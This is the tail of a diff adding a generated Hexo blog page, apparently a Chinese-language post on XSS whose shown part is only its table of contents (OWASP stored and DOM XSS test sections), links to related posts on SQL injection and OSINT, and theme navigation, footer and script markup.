class="toc-link" href="#%E6%B5%8B%E8%AF%95%E5%AD%98%E5%82%A8%E7%9A%84%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC-OTG-INPVAL-002"><span class="toc-number">2.1.0.2.0.5.</span> <span class="toc-text">测试存储的跨站点脚本 (OTG-INPVAL-002)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E5%9F%BA%E4%BA%8E-DOM-%E7%9A%84%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC-OTG-CLIENT-001"><span class="toc-number">2.1.0.2.0.6.</span> <span class="toc-text">测试基于 DOM 的跨站点脚本 (OTG-CLIENT-001)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E-DOM-%E7%9A%84-XSS"><span class="toc-number">2.1.0.2.0.7.</span> <span class="toc-text">基于 DOM 的 XSS</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC-XSS-%E5%A4%87%E5%BF%98%E5%8D%95-%E7%BB%B4%E6%8B%89%E4%BB%A3%E7%A0%81"><span class="toc-number">2.1.0.2.0.8.</span> <span class="toc-text">跨站点脚本 (XSS) 备忘单 | 维拉代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A8%E8%8D%90%E4%B9%A6%E7%B1%8D%EF%BC%9A"><span class="toc-number">2.1.0.3.</span> <span class="toc-text">推荐书籍：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%8B%E9%9A%86%E7%8E%B0%E6%9C%89%E5%AD%98%E5%82%A8%E5%BA%93%EF%BC%88%E4%BD%BF%E7%94%A8-HTTPS-%E5%85%8B%E9%9A%86%EF%BC%89"><span class="toc-number">2.1.1.</span> <span class="toc-text">克隆现有存储库（使用 HTTPS 克隆）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%8B%E9%9A%86%E7%8E%B0%E6%9C%89%E5%AD%98%E5%82%A8%E5%BA%93%EF%BC%88%E4%BD%BF%E7%94%A8-SSH-%E5%85%8B%E9%9A%86%EF%BC%89"><span class="toc-number">2.1.2.</span> <span class="toc-text">克隆现有存储库（使用 SSH 克隆）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-4-XSS-CSRF%E5%92%8CSSRF%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">2.1.3.</span> <span class="toc-text">1.2.4 XSS,CSRF和SSRF区别是什么？</span></a></li></ol></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/2023/04/09/Internet%20Security/hello-world/" rel="bookmark" title="SQL注入">SQL注入</a></li><li><a href="/2023/04/10/Internet%20Security/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" rel="bookmark" title="信息搜集">信息搜集</a></li><li><a href="/2023/04/11/Internet%20Security/OSINT/" rel="bookmark" title="OSINT">OSINT</a></li><li class="active"><a href="/2023/04/12/Internet%20Security/XSS/" rel="bookmark" title="XSS">XSS</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="Blank"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">Blank</p>
+  <div class="description" itemprop="description">繁星不怕被看作流萤</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">4</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">1</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">2</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JsYW5rbGVk" title="https:&#x2F;&#x2F;github.com&#x2F;blankled"><i class="ic i-github"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>friends</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/reader/" rel="section"><i class="ic i-heart"></i>reader</a>
+  </li>
+
+  </ul>
+    
+  <li class="item">
+    <a href="/links/" rel="section"><i class="ic i-magic"></i>links</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E7%BD%91%E5%AE%89/" title="分类于 网安">网安</a>
+</div>
+
+    <span><a href="/2023/04/10/Internet%20Security/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="信息搜集">信息搜集</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E7%BD%91%E5%AE%89/" title="分类于 网安">网安</a>
+</div>
+
+    <span><a href="/2023/04/11/Internet%20Security/OSINT/" title="OSINT">OSINT</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E7%BD%91%E5%AE%89/" title="分类于 网安">网安</a>
+</div>
+
+    <span><a href="/2023/04/12/Internet%20Security/XSS/" title="XSS">XSS</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E7%BD%91%E5%AE%89/" title="分类于 网安">网安</a>
+</div>
+
+    <span><a href="/2023/04/09/Internet%20Security/hello-world/" title="SQL注入">SQL注入</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-BLANK"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Blank @ BLANK</span>
+  </div>
+  <div class="count">
+    <span class="post-meta-item-icon">
+      <i class="ic i-chart-area"></i>
+    </span>
+    <span title="站点总字数">6k 字</span>
+
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="ic i-coffee"></i>
+    </span>
+    <span title="站点阅读时长">24 分钟</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/04/12/Internet Security/XSS/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":210,"height":420},"mobile":{"show":true},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
